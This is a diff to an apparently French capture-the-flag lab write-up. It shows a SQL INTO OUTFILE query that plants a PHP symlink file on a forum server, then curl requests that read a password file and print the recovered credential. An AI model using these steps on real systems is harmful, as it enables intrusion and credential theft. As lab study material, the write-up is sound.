@@ -7,15 +7,20 @@ SELECT '<?php symlink("/", "search.php"); echo "OK"; ?>'
 INTO OUTFILE '/var/www/forum/templates_c/test3.php'
 FIELDS TERMINATED BY '' ENCLOSED BY '' ESCAPED BY ''
 LINES TERMINATED BY '';
+```
 
+---
 
-
-
+### Exécution du payload
+```bash
 curl -ks "https://192.168.56.101/forum/templates_c/test3.php"
 # Réponse attendue : OK
+```
 
+---
 
+### Lecture du fichier sensible
+```bash
 curl -ks "https://192.168.56.101/forum/templates_c/search.php/home/LOOKATME/password"
 # → lmezard:G!@M6f4Eatau{sF"
-
-
+```
